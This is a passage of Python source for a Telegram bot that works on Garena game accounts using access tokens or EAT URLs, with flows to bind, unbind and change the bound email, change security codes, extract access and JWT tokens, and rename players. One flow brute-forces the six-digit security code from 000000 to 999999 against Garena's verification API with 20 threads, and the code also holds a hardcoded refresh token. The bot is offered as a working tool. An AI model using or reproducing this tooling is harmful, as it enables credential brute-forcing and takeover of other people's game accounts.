            return STATE_INPUT

        if text_lower == "bind email":
            context.user_data.clear()
            context.user_data["flow"] = "bind"
            context.user_data["step"] = "token"
            await update.message.reply_text("Please Enter Your Access Token (CLI option 2):", reply_markup=get_youtube_keyboard())
            return STATE_INPUT

        if text_lower == "unbind email":
            context.user_data.clear()
            context.user_data["flow"] = "unbind"
            context.user_data["step"] = "method"
            await update.message.reply_text("Choose Unbind Method (CLI option 3):", reply_markup=get_method_keyboard())
            return STATE_INPUT

        if text_lower == "change bind email":
            context.user_data.clear()
            context.user_data["flow"] = "change"
            context.user_data["step"] = "method"
            await update.message.reply_text("Choose Change Method (CLI option 4):", reply_markup=get_method_keyboard())
            return STATE_INPUT

        if text_lower == "cancel bind request":
            context.user_data.clear()
            context.user_data["flow"] = "cancel"
            context.user_data["step"] = "token"
            await update.message.reply_text("Please Enter Your Access Token (CLI option 5):", reply_markup=get_youtube_keyboard())
            return STATE_INPUT

        if text_lower == "security code info" or text_lower == "sec code info":
            context.user_data.clear()
            context.user_data["flow"] = "sec_info"
            context.user_data["step"] = "token"
            await update.message.reply_text("Please Enter Your Access Token (CLI option 6 - Security Code Info):", reply_markup=get_youtube_keyboard())
            return STATE_INPUT

        if text_lower == "change sec code" or text_lower == "change security code":
            context.user_data.clear()
            context.user_data["flow"] = "change_sec"
            context.user_data["step"] = "token"
            await update.message.reply_text("Please Enter Your Access Token (CLI option 10 - Change Security Code):", reply_markup=get_youtube_keyboard())
            return STATE_INPUT

        if "eat to token" in text_lower or "kiosgamer" in text_lower or "discstore" in text_lower or ("https://" in text_lower and "eat=" in text_lower):
            if "eat=" in text or "kiosgamer" in text or "discstore" in text:
                await update.message.reply_text("🔍 EAT URL se 2 Token nikal raha hu... Example: https://discstore.kiosgamer.co.id/?eat=a1824a71... -> c41a6ace... + eyJh...", reply_markup=get_youtube_keyboard())
                res = eat_to_both_tokens_sync(text)
                if res["ok"]:
                    msg = f"✅ EAT TO TOKENS SUCCESS (CLI option 7)\n\n👤 Nick: {res['nickname']}\n🆔 ID: {res['account_id']}\n🌍 Region: {res['region']}\n\n🔑 Access Token:\n{res['access_token']}\n\n"
                    if res.get('jwt_token'):
                        msg += f"🎫 JWT Token:\n{res['jwt_token']}\n\nFull URL: {res.get('full_url','')[:100]}..."
                    await update.message.reply_text(msg, reply_markup=get_youtube_keyboard())
                else:
                    await update.message.reply_text(f"❌ Error: {res.get('error')}", reply_markup=get_youtube_keyboard())
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT
            else:
                context.user_data.clear()
                context.user_data["flow"] = "eat"
                context.user_data["step"] = "token"
                await update.message.reply_text("Please Enter Your EAT Token Or Full EAT URL (CLI option 7):\nExample: https://discstore.kiosgamer.co.id/?eat=a1824a71...", reply_markup=get_youtube_keyboard())
                return STATE_INPUT

        if text_lower == "revoke access token" or text_lower == "revoke token":
            context.user_data.clear()
            context.user_data["flow"] = "revoke"
            context.user_data["step"] = "token"
            await update.message.reply_text("Please Enter Your Access Token to Revoke (CLI option 8):", reply_markup=get_youtube_keyboard())
            return STATE_INPUT

        if text_lower == "full account info" or text_lower == "full info":
            context.user_data.clear()
            context.user_data["flow"] = "full_info"
            context.user_data["step"] = "token"
            await update.message.reply_text("Please Enter Your Access Token (CLI option 11 - Full Account Info):", reply_markup=get_youtube_keyboard())
            return STATE_INPUT

        if text_lower == "fix unsubscribe" or "unsubscribe" in text_lower:
            context.user_data.clear()
            context.user_data["flow"] = "fix_unsub"
            context.user_data["step"] = "token"
            await update.message.reply_text("Please Enter Your Access Token (CLI option 12 - Fix Single Unsubscribe):", reply_markup=get_youtube_keyboard())
            return STATE_INPUT

        if text_lower == "game login data" or text_lower == "login data":
            context.user_data.clear()
            context.user_data["flow"] = "game_login"
            context.user_data["step"] = "token"
            await update.message.reply_text("Please Enter Your Access Token (CLI option 13 - Game Login Data Protobuf):", reply_markup=get_youtube_keyboard())
            return STATE_INPUT

        if "bio update" in text_lower or text_lower == "bio 240" or text_lower == "bio update 240":
            context.user_data.clear()
            context.user_data["flow"] = "bio_update"
            context.user_data["step"] = "token"
            await update.message.reply_text("Please Enter Your Access Token (CLI option 14 - Bio Update 240 + Emoji - JWT):", reply_markup=get_youtube_keyboard())
            return STATE_INPUT

        if "name change" in text_lower or text_lower == "name change 12":
            context.user_data.clear()
            context.user_data["flow"] = "name_change"
            context.user_data["step"] = "token"
            await update.message.reply_text("Please Enter Your Access Token (CLI option 15 - Name Change 12 chars - Card needed):", reply_markup=get_youtube_keyboard())
            return STATE_INPUT

        if text_lower == "security code find" or text_lower == "sec code find":
            context.user_data.clear()
            context.user_data["flow"] = "sec_find"
            context.user_data["step"] = "token"
            await update.message.reply_text("🔐 SECURITY CODE FIND - REAL BRUTE FORCE\n\nEAT URL / Access Token bhejo:\nExample: https://discstore.kiosgamer.co.id/?eat=a1824a71...\nYa c41a6ace...\n\nBind email ki tarah security code bhi nikalega 000000-999999 try karke", reply_markup=get_youtube_keyboard())
            return STATE_INPUT

        if text_lower == "check bound" or text_lower == "check bound accounts":
            context.user_data.clear()
            context.user_data["flow"] = "bound"
            context.user_data["step"] = "token"
            await update.message.reply_text("Please Enter Your Access Token (Check Bound Accounts):", reply_markup=get_youtube_keyboard())
            return STATE_INPUT

        if text_lower == "get login history":
            context.user_data.clear()
            context.user_data["flow"] = "login_history"
            context.user_data["step"] = "token"
            await update.message.reply_text("Please Enter Your Access Token Or JWT (Login History Protobuf):", reply_markup=get_youtube_keyboard())
            return STATE_INPUT

        if text_lower == "owner details":
            msg = f"👑 OWNER DETAILS - Zevric X Play\n\n⊛ Developer Name: Zevric X Play\n⊛ Telegram: @just_zevric\n⊛ Channel: https://t.me/just_zevric\n⊛ YouTube: https://youtube.com/@zevricxplay\n⊛ GitHub: github.com/zevricxplay\n⊛ Tool Version: v1.7 (15 Options - Final)\n\nSpecial Note:\nName Change + Bio 240 + Game Login Data!\nBina ID login ke Access Token se naam badlo!\n\nJAI SHREE RAM 🙏"
            await update.message.reply_text(msg, reply_markup=get_youtube_keyboard())
            await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
            return STATE_INPUT

        if text_lower == "back to menu":
            context.user_data.clear()
            await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
            return STATE_INPUT

        # ===== FLOWS =====
        if flow == "bind_info":
            if step == "token":
                await update.message.reply_text("Fetching Bind Info + Player Info (CLI 1)...", reply_markup=get_youtube_keyboard())
                uid,nick,region,_ = get_player_info_sync(text)
                bind = fetch_bind_info_sync(text)
                if not bind["ok"]:
                    await update.message.reply_text(f"Error: {bind['error']}", reply_markup=get_youtube_keyboard())
                else:
                    data = bind["data"]
                    email = data.get("email", "")
                    email_to_be = data.get("email_to_be", "")
                    countdown = data.get("request_exec_countdown", 0)
                    msg = f"≡ Player Information\nUID: {uid}\nNickname: {nick}\nRegion: {region}\n\n≡ Bind Information\nCurrent Email: {email or 'None'}\nPending Email: {email_to_be or 'None'}\nCountdown: {convert_seconds(countdown)}\nResult Code: {data.get('result',-1)}\n\nRaw: {json.dumps(data)[:300]}..."
                    await update.message.reply_text(msg, reply_markup=get_youtube_keyboard())
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "bind":
            if step == "token":
                context.user_data["token"] = text
                uid,nick,region,_ = get_player_info_sync(text)
                bind = fetch_bind_info_sync(text)
                cur = bind["data"].get("email","None") if bind["ok"] else "Unknown"
                await update.message.reply_text(f"Player: {nick} ({uid})\nCurrent Email: {cur}\n\nPlease Enter New Email To Bind:", reply_markup=get_youtube_keyboard())
                context.user_data["step"] = "email"
                return STATE_INPUT
            if step == "email":
                context.user_data["email"] = text
                await update.message.reply_text(f"Sending OTP To {text}...", reply_markup=get_youtube_keyboard())
                res = send_otp_sync(text, context.user_data["token"])
                if res["ok"]:
                    await update.message.reply_text(f"OTP Sent To {text}, Please Enter OTP:", reply_markup=get_youtube_keyboard())
                    context.user_data["step"] = "otp"
                else:
                    await update.message.reply_text(f"Failed To Send OTP: {res.get('data')}", reply_markup=get_youtube_keyboard())
                return STATE_INPUT
            if step == "otp":
                res = verify_otp_sync(context.user_data["email"], context.user_data["token"], text)
                if res["ok"]:
                    vt = res["data"].get("verifier_token")
                    # In CLI version, no sec code needed for bind, but we support with sec
                    await update.message.reply_text("OTP Verified. Creating Bind Request...", reply_markup=get_youtube_keyboard())
                    bind_res = create_bind_request_sync(context.user_data["email"], context.user_data["token"], vt)
                    if bind_res["ok"]:
                        await update.message.reply_text(f"✅ Bind Success: {bind_res['data']}", reply_markup=get_youtube_keyboard())
                    else:
                        await update.message.reply_text(f"❌ Bind Failed: {bind_res['data']}", reply_markup=get_youtube_keyboard())
                        # Try with sec code ask
                        await update.message.reply_text("If need secondary password, enter 6-digit code or type skip:", reply_markup=get_youtube_keyboard())
                        context.user_data["verifier_token"] = vt
                        context.user_data["step"] = "sec"
                        return STATE_INPUT
                else:
                    await update.message.reply_text(f"Verify Failed: {res['data']}")
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT
            if step == "sec":
                if text.lower() == "skip":
                    await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                    context.user_data.clear()
                    return STATE_INPUT
                res = create_bind_request_sync(context.user_data["email"], context.user_data["token"], context.user_data["verifier_token"], text)
                if res["ok"]:
                    await update.message.reply_text(f"✅ Bind Success with Sec Code: {res['data']}", reply_markup=get_youtube_keyboard())
                else:
                    await update.message.reply_text(f"❌ Bind Failed: {res['data']}", reply_markup=get_youtube_keyboard())
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "unbind":
            if step == "method":
                if "otp" in text_lower:
                    context.user_data["method"] = "otp"
                else:
                    context.user_data["method"] = "sec"
                await update.message.reply_text("Please Enter Access Token For Unbind (CLI 3):", reply_markup=get_youtube_keyboard())
                context.user_data["step"] = "token"
                return STATE_INPUT
            if step == "token":
                context.user_data["token"] = text
                bind = fetch_bind_info_sync(text)
                if not bind["ok"] or not bind["data"].get("email"):
                    await update.message.reply_text("No Bound Email Found.", reply_markup=get_youtube_keyboard())
                    await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                    context.user_data.clear()
                    return STATE_INPUT
                email = bind["data"].get("email")
                context.user_data["email"] = email
                if context.user_data.get("method") == "otp":
                    await update.message.reply_text(f"Current Email: {email}\nSending OTP...", reply_markup=get_youtube_keyboard())
                    res = send_otp_sync(email, text)
                    if res["ok"]:
                        await update.message.reply_text(f"OTP Sent To {email}, Please Enter OTP:", reply_markup=get_youtube_keyboard())
                        context.user_data["step"] = "otp"
                    else:
                        await update.message.reply_text(f"Failed: {res.get('data')}", reply_markup=get_youtube_keyboard())
                else:
                    await update.message.reply_text("Please Enter 6-Digit Security Code:", reply_markup=get_youtube_keyboard())
                    context.user_data["step"] = "sec_code"
                return STATE_INPUT
            if step == "otp":
                res = verify_identity_otp_sync(context.user_data["email"], context.user_data["token"], text)
                if res["ok"]:
                    identity_token = res["data"].get("identity_token")
                    unbind_res = create_unbind_request_sync(identity_token, context.user_data["token"])
                    if unbind_res["ok"]:
                        await update.message.reply_text(f"✅ Unbind Success: {unbind_res['data']}", reply_markup=get_youtube_keyboard())
                    else:
                        await update.message.reply_text(f"❌ Unbind Failed: {unbind_res['data']}", reply_markup=get_youtube_keyboard())
                else:
                    await update.message.reply_text(f"Verify Failed: {res['data']}")
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT
            if step == "sec_code":
                res = verify_identity_sec_sync(context.user_data["email"], context.user_data["token"], text)
                if res["ok"]:
                    identity_token = res["data"].get("identity_token")
                    unbind_res = create_unbind_request_sync(identity_token, context.user_data["token"])
                    if unbind_res["ok"]:
                        await update.message.reply_text(f"✅ Unbind Success Via Sec Code: {unbind_res['data']}", reply_markup=get_youtube_keyboard())
                    else:
                        await update.message.reply_text(f"❌ Unbind Failed: {unbind_res['data']}", reply_markup=get_youtube_keyboard())
                else:
                    await update.message.reply_text(f"Verify Failed: {res['data']}")
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "change":
            if step == "method":
                if "otp" in text_lower:
                    context.user_data["method"] = "otp"
                else:
                    context.user_data["method"] = "sec"
                await update.message.reply_text("Please Enter Access Token For Change (CLI 4):", reply_markup=get_youtube_keyboard())
                context.user_data["step"] = "token"
                return STATE_INPUT
            if step == "token":
                context.user_data["token"] = text
                bind = fetch_bind_info_sync(text)
                if not bind["ok"] or not bind["data"].get("email"):
                    await update.message.reply_text("No Bound Email Found.", reply_markup=get_youtube_keyboard())
                    await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                    context.user_data.clear()
                    return STATE_INPUT
                email = bind["data"].get("email")
                context.user_data["old_email"] = email
                if context.user_data.get("method") == "otp":
                    await update.message.reply_text(f"Current Email: {email}\nSending OTP...", reply_markup=get_youtube_keyboard())
                    res = send_otp_sync(email, text)
                    if res["ok"]:
                        await update.message.reply_text(f"OTP Sent To {email}, Please Enter OTP:", reply_markup=get_youtube_keyboard())
                        context.user_data["step"] = "old_otp"
                    else:
                        await update.message.reply_text(f"Failed: {res.get('data')}")
                else:
                    await update.message.reply_text("Please Enter 6-Digit Security Code Of Old Email:", reply_markup=get_youtube_keyboard())
                    context.user_data["step"] = "sec_code"
                return STATE_INPUT
            if step == "old_otp":
                res = verify_identity_otp_sync(context.user_data["old_email"], context.user_data["token"], text)
                if res["ok"]:
                    context.user_data["identity_token"] = res["data"].get("identity_token")
                    await update.message.reply_text("Old Email Verified. Please Enter New Email:", reply_markup=get_youtube_keyboard())
                    context.user_data["step"] = "new_email"
                else:
                    await update.message.reply_text(f"Verify Failed: {res['data']}")
                return STATE_INPUT
            if step == "sec_code":
                res = verify_identity_sec_sync(context.user_data["old_email"], context.user_data["token"], text)
                if res["ok"]:
                    context.user_data["identity_token"] = res["data"].get("identity_token")
                    await update.message.reply_text("Verified Via Sec Code. Please Enter New Email:", reply_markup=get_youtube_keyboard())
                    context.user_data["step"] = "new_email"
                else:
                    await update.message.reply_text(f"Verify Failed: {res['data']}")
                return STATE_INPUT
            if step == "new_email":
                context.user_data["new_email"] = text
                await update.message.reply_text(f"Sending OTP To {text}...", reply_markup=get_youtube_keyboard())
                res = send_otp_sync(text, context.user_data["token"])
                if res["ok"]:
                    await update.message.reply_text(f"OTP Sent To {text}, Please Enter OTP:", reply_markup=get_youtube_keyboard())
                    context.user_data["step"] = "new_otp"
                else:
                    await update.message.reply_text(f"Failed: {res.get('data')}")
                return STATE_INPUT
            if step == "new_otp":
                res = verify_otp_sync(context.user_data["new_email"], context.user_data["token"], text)
                if res["ok"]:
                    vt = res["data"].get("verifier_token")
                    rebind = create_rebind_request_sync(context.user_data["identity_token"], context.user_data["new_email"], vt, context.user_data["token"])
                    if rebind["ok"]:
                        await update.message.reply_text(f"✅ Change Success: {rebind['data']}", reply_markup=get_youtube_keyboard())
                    else:
                        await update.message.reply_text(f"❌ Change Failed: {rebind['data']}", reply_markup=get_youtube_keyboard())
                else:
                    await update.message.reply_text(f"Verify Failed: {res['data']}")
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "cancel":
            if step == "token":
                await update.message.reply_text("Cancelling Request (CLI 5)...", reply_markup=get_youtube_keyboard())
                uid,nick,region,_ = get_player_info_sync(text)
                bind = fetch_bind_info_sync(text)
                cur = bind["data"].get("email","None") if bind["ok"] else "Unknown"
                pend = bind["data"].get("email_to_be","None") if bind["ok"] else "Unknown"
                await update.message.reply_text(f"Player: {nick} ({uid})\nCurrent: {cur}\nPending: {pend}", reply_markup=get_youtube_keyboard())
                res = cancel_request_sync(text)
                if res["ok"]:
                    await update.message.reply_text(f"✅ Cancel Success: {res['data']}", reply_markup=get_youtube_keyboard())
                else:
                    await update.message.reply_text(f"❌ Cancel Failed: {res['data']}", reply_markup=get_youtube_keyboard())
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "sec_info":
            if step == "token":
                await update.message.reply_text("Fetching Security Code Info (CLI 6)...", reply_markup=get_youtube_keyboard())
                bind = fetch_bind_info_sync(text)
                if not bind["ok"]:
                    await update.message.reply_text(f"Error: {bind['error']}", reply_markup=get_youtube_keyboard())
                else:
                    data = bind["data"]
                    sec = data.get("secondary_password")
                    status = "✓ ACTIVE" if sec else "✗ NO CODE"
                    msg = f"≡ Security Code Status\n{status}\n\nFull Bind Data:\n{json.dumps(data, indent=2)[:800]}..."
                    await update.message.reply_text(msg, reply_markup=get_youtube_keyboard())
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "change_sec":
            if step == "token":
                context.user_data["token"] = text
                bind = fetch_bind_info_sync(text)
                if not bind["ok"] or not bind["data"].get("email"):
                    await update.message.reply_text("No Bound Email Found - need email to change sec code (CLI 10).", reply_markup=get_youtube_keyboard())
                    await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                    context.user_data.clear()
                    return STATE_INPUT
                email = bind["data"].get("email")
                context.user_data["email"] = email
                await update.message.reply_text(f"Current Email: {email}\nSending OTP for Change Sec Code...", reply_markup=get_youtube_keyboard())
                res = send_otp_sync(email, text)
                if res["ok"]:
                    await update.message.reply_text(f"OTP Sent To {email}, Please Enter OTP:", reply_markup=get_youtube_keyboard())
                    context.user_data["step"] = "otp"
                else:
                    await update.message.reply_text(f"Failed: {res.get('data')}", reply_markup=get_youtube_keyboard())
                return STATE_INPUT
            if step == "otp":
                res = verify_identity_otp_sync(context.user_data["email"], context.user_data["token"], text)
                if res["ok"]:
                    context.user_data["identity_token"] = res["data"].get("identity_token")
                    await update.message.reply_text("Verified. Please Enter NEW 6-digit Security Code:", reply_markup=get_youtube_keyboard())
                    context.user_data["step"] = "new_code"
                else:
                    await update.message.reply_text(f"Verify Failed: {res['data']}")
                return STATE_INPUT
            if step == "new_code":
                if not text.isdigit() or len(text)!=6:
                    await update.message.reply_text("Must be 6 digits! Try again:", reply_markup=get_youtube_keyboard())
                    return STATE_INPUT
                # Try change sec password APIs
                headers={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
                success=False
                for url in ["https://100067.connect.garena.com/game/account_security/bind:change_secondary_password","https://100067.connect.garena.com/game/account_security/bind:update_secondary_password"]:
                    try:
                        r=requests.post(url,headers=headers,data={"app_id":"100067","access_token":context.user_data["token"],"identity_token":context.user_data["identity_token"],"secondary_password":text},timeout=15)
                        j=r.json() if r.text.startswith('{') else {}
                        if j.get("result")==0:
                            await update.message.reply_text(f"✅ Security Code Changed to {text}!\nResponse: {j}", reply_markup=get_youtube_keyboard())
                            success=True
                            break
                        else:
                            await update.message.reply_text(f"Try {url.split(':')[-1]}: {j}", reply_markup=get_youtube_keyboard())
                    except Exception as e:
                        await update.message.reply_text(f"Error: {e}", reply_markup=get_youtube_keyboard())
                if not success:
                    await update.message.reply_text("❌ Change failed - try via game or check API", reply_markup=get_youtube_keyboard())
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "eat":
            if step == "token":
                await update.message.reply_text("Fetching Both Tokens From EAT URL (CLI 7)...", reply_markup=get_youtube_keyboard())
                res = eat_to_both_tokens_sync(text)
                if res["ok"]:
                    msg = f"✅ EAT TO TOKENS SUCCESS (CLI 7)\n\n👤 Nick: {res['nickname']}\n🆔 ID: {res['account_id']}\n🌍 Region: {res['region']}\n\n🔑 Access Token:\n{res['access_token']}\n\n"
                    if res.get('jwt_token'):
                        msg += f"🎫 JWT Token:\n{res['jwt_token']}"
                    await update.message.reply_text(msg, reply_markup=get_youtube_keyboard())
                else:
                    await update.message.reply_text(f"❌ Error: {res.get('error')}", reply_markup=get_youtube_keyboard())
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "revoke":
            if step == "token":
                await update.message.reply_text("Revoking Token (CLI 8)...", reply_markup=get_youtube_keyboard())
                try:
                    uid,nick,region,full_url = get_player_info_sync(text)
                    if "Unknown" in uid and "account_id" not in full_url:
                        await update.message.reply_text("Token already invalid / expired", reply_markup=get_youtube_keyboard())
                    else:
                        refresh_token = "1380dcb63ab3a077dc05bdf0b25ba4497c403a5b4eae96d7203010eafa6c83a8"
                        logout_url = f"https://100067.connect.garena.com/oauth/logout?access_token={text}&refresh_token={refresh_token}"
                        logout_res = requests.get(logout_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
                        if logout_res.status_code==200 and "error" not in logout_res.text:
                            await update.message.reply_text(f"✅ Revoked Success\nNick: {nick}\nID: {uid}\nRegion: {region}", reply_markup=get_youtube_keyboard())
                        else:
                            await update.message.reply_text(f"❌ Revoke Failed: {logout_res.text[:200]}", reply_markup=get_youtube_keyboard())
                except Exception as e:
                    await update.message.reply_text(f"Error: {str(e)[:200]}", reply_markup=get_youtube_keyboard())
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "full_info":
            if step == "token":
                await update.message.reply_text("Fetching Full Account Info (CLI 11)...", reply_markup=get_youtube_keyboard())
                uid,nick,region,_ = get_player_info_sync(text)
                bind = fetch_bind_info_sync(text)
                email = bind["data"].get("email","None") if bind["ok"] else "Error"
                email_to_be = bind["data"].get("email_to_be","None") if bind["ok"] else "Error"
                sec = bind["data"].get("secondary_password") if bind["ok"] else False
                sec_status = "SET" if sec else "NOT SET"
                msg = f"● FULL SUMMARY (CLI 11)\n\n⊛ UID: {uid}\n⊛ Nickname: {nick}\n⊛ Region: {region}\n⊛ Email: {email}\n⊛ Pending: {email_to_be}\n⊛ Security Code: {sec_status}\n⊛ Countdown: {convert_seconds(bind['data'].get('request_exec_countdown',0)) if bind['ok'] else 'N/A'}"
                await update.message.reply_text(msg, reply_markup=get_youtube_keyboard())
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "fix_unsub":
            if step == "token":
                await update.message.reply_text("Fixing Single Unsubscribe (CLI 12)...", reply_markup=get_youtube_keyboard())
                res = fix_unsubscribe_sync(text)
                if res["ok"]:
                    await update.message.reply_text(f"✅ Fix Attempted for {res['email']}\nResults: {res['results']}", reply_markup=get_youtube_keyboard())
                else:
                    await update.message.reply_text(f"❌ Error: {res['error']}", reply_markup=get_youtube_keyboard())
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "game_login":
            if step == "token":
                await update.message.reply_text("Fetching Game Login Data Protobuf (CLI 13)...", reply_markup=get_youtube_keyboard())
                res = game_login_data_sync(text)
                if res["ok"]:
                    msg = f"● GAME LOGIN DATA (CLI 13)\n\n⊛ UID: {res['uid']}\n⊛ Nickname: {res['nick']}\n⊛ Region: {res['region']}\n⊛ JWT: {(res['jwt'] or 'Not Retrieved')[:60]}...\n⊛ Server URL: {res['server'] or 'Not Retrieved'}"
                    await update.message.reply_text(msg, reply_markup=get_youtube_keyboard())
                else:
                    await update.message.reply_text(f"❌ Error: {res['error']}", reply_markup=get_youtube_keyboard())
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "bio_update":
            if step == "token":
                context.user_data["token"] = text
                uid,nick,region,_ = get_player_info_sync(text)
                await update.message.reply_text(f"Player: {nick} ({uid}) Region: {region}\n\nEnter Region [IND/BD/SG/BR] or type same region:", reply_markup=get_youtube_keyboard())
                context.user_data["step"] = "region"
                context.user_data["detected_region"] = region
                return STATE_INPUT
            if step == "region":
                region = text.upper() if text else context.user_data.get("detected_region","IND")
                context.user_data["region"] = region
                await update.message.reply_text(f"Region set: {region}\n\nEnter NEW Bio (240 chars + emoji allowed):", reply_markup=get_youtube_keyboard())
                context.user_data["step"] = "bio"
                return STATE_INPUT
            if step == "bio":
                bio = text
                await update.message.reply_text(f"Updating Bio to: {bio[:50]}... (Length {len(bio)}/240)", reply_markup=get_youtube_keyboard())
                res = bio_update_sync(context.user_data["token"], context.user_data["region"], bio)
                if res["ok"]:
                    await update.message.reply_text(f"✅ Bio Updated!\nUID: {context.user_data.get('token','')[:10]}...\nNew Bio: {bio}\nResponse: {res['response']}", reply_markup=get_youtube_keyboard())
                else:
                    await update.message.reply_text(f"❌ Failed: {res['error']}", reply_markup=get_youtube_keyboard())
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "name_change":
            if step == "token":
                context.user_data["token"] = text
                uid,nick,region,_ = get_player_info_sync(text)
                await update.message.reply_text(f"Player: {nick} ({uid}) Region: {region}\n\nEnter Region [IND/BD/SG/BR] or type same region:", reply_markup=get_youtube_keyboard())
                context.user_data["step"] = "region"
                context.user_data["old_nick"] = nick
                context.user_data["detected_region"] = region
                return STATE_INPUT
            if step == "region":
                region = text.upper() if text else context.user_data.get("detected_region","IND")
                context.user_data["region"] = region
                await update.message.reply_text(f"Region: {region}\n\nRules: Max 12 chars, No emoji, Need Card (39D+200GT) or 390 Diamonds\n\nEnter NEW Nickname (12 chars max):", reply_markup=get_youtube_keyboard())
                context.user_data["step"] = "new_name"
                return STATE_INPUT
            if step == "new_name":
                new_name = text
                await update.message.reply_text(f"Trying Name Change: {context.user_data.get('old_nick')} -> {new_name}...", reply_markup=get_youtube_keyboard())
                res = name_change_sync(context.user_data["token"], context.user_data["region"], new_name)
                if res["ok"]:
                    await update.message.reply_text(f"✅ SUCCESS (CLI 15)\nUID: {context.user_data.get('token','')[:10]}...\nOld: {context.user_data.get('old_nick')}\nNew: {new_name}\nResponse: {res['response']}", reply_markup=get_youtube_keyboard())
                else:
                    await update.message.reply_text(f"❌ Failed: {res['error']}\n\nSolution: Buy Name Change Card in game Store -> Redeem -> Guild Token (39D + 200 GT)", reply_markup=get_youtube_keyboard())
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "sec_find":
            if step == "token":
                status_msg = await update.message.reply_text("🔐 REAL Security Code Find (Like Bind Email)...\n\nEAT URL se Access + JWT nikal raha hu, fir 000000-999999 brute force...", reply_markup=get_youtube_keyboard())
                try:
                    # Use eat_to_both to get access token if EAT URL given
                    access_token = text
                    if "eat=" in text or "kiosgamer" in text or "discstore" in text:
                        eat_res = eat_to_both_tokens_sync(text)
                        if not eat_res["ok"]:
                            await status_msg.edit_text(f"❌ EAT Failed: {eat_res['error']}")
                            await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                            context.user_data.clear()
                            return STATE_INPUT
                        access_token = eat_res["access_token"]
                        await status_msg.edit_text(f"✅ EAT -> Access Token: {access_token[:20]}...\nNow brute forcing security code...")
                    # Get email
                    bind = fetch_bind_info_sync(access_token)
                    if not bind["ok"] or not bind["data"].get("email"):
                        await status_msg.edit_text("❌ No bound email - cannot brute force sec code without email")
                        await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                        context.user_data.clear()
                        return STATE_INPUT
                    email = bind["data"].get("email")
                    await status_msg.edit_text(f"📧 Email: {email}\n🔍 Brute forcing 000000-999999 via verify_identity API (20 threads)... This may take time")
                    brute = brute_force_sec_code_api(email, access_token)
                    if brute["found"]:
                        msg = f"✅ REAL SECURITY CODE FOUND! (API Brute Force)\n\n👤 Email: {email}\n🔓 Code: {brute['code']}\n🔑 Hash: {brute['hash'][:20]}...\nAttempts: {brute['attempts']}\n\nYe wahi code hai jo bind karte time lagaya tha!"
                        await status_msg.edit_text(msg)
                    else:
                        await status_msg.edit_text(f"❌ Not Found After {brute['attempts']} attempts\nGarena rate limit lagaya hoga. Try Via OTP.")
                except Exception as e:
                    await status_msg.edit_text(f"❌ Error: {str(e)[:300]}")
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "bound":
            if step == "token":
                await update.message.reply_text("Checking Bound Accounts...", reply_markup=get_youtube_keyboard())
                res = fetch_platform_binds_sync(text)
                if res["ok"]:
                    bounded = res.get('bounded', [])
                    available = res.get('available', [])
                    b_text = "Bound Accounts\n\nBound:\n"
                    if not bounded:
                        b_text += "None\n"
                    else:
                        for pid in bounded:
                            b_text += f"{PLATFORM_MAP_FULL.get(pid, f'Unknown ({pid})')}\n"
                    b_text += "\nAvailable:\n"
                    if not available:
                        b_text += "None\n"
                    else:
                        for pid in available:
                            b_text += f"{PLATFORM_MAP_FULL.get(pid, f'Unknown ({pid})')}\n"
                    await update.message.reply_text(b_text, reply_markup=get_youtube_keyboard())
                else:
                    await update.message.reply_text(f"Error: {res.get('error')}", reply_markup=get_youtube_keyboard())
                await update.message.reply_text("Main Menu - 15 Options:", reply_markup=get_reply_keyboard())
                context.user_data.clear()
                return STATE_INPUT

        if flow == "login_history":
            if step == "token":
                await update.message.reply_text("Fetching Login History Protobuf...", reply_markup=get_youtube_keyboard())
                try:
